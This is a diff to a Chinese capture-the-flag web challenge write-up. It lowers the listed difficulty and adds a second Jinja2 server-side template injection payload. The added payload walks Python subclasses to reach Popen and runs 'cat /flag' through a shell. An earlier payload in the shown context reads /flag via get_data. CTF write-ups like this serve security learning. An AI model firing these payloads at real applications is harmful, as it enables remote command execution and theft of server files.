@@ -1,6 +1,6 @@
 - **题目名称：** 你买车票没
 - **题目类型：** WEB
-- **题目难度：** 中等
+- **题目难度：** 容易
 - **出题人：** gbljdgb
 - **考点：**
 
@@ -18,5 +18,11 @@ payload如下
 {{ c["get_data"](0, "/flag") }}
 {% endif %}
 {% endfor %}&password=1
+
+?name={% for c in [].__class__.__base__.__subclasses__() %}
+{% if 'Popen' in c.__name__ %}
+{{ c('cat /flag',shell=True,stdout=-1).communicate()[0].strip() }}
+{% endif %}
+{% endfor %}
 ```
 
